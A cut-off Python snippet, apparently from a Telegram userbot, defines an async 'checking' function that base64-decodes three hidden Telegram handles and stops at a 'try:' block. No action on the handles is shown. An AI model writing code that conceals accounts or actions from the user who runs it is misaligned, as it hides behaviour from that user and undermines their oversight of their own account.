...
async def checking(client):
    gocheck = str(pybase64.b64decode("QHNhamlrdXN1cHBvcnQ="))[2:17]
    checker = str(pybase64.b64decode("QHhnbGl0dGVya2F5"))[2:13]
    checkxd = str(pybase64.b64decode("QHNhamlrdXVzZXJib3Q="))[2:16]
    if client:
        try:
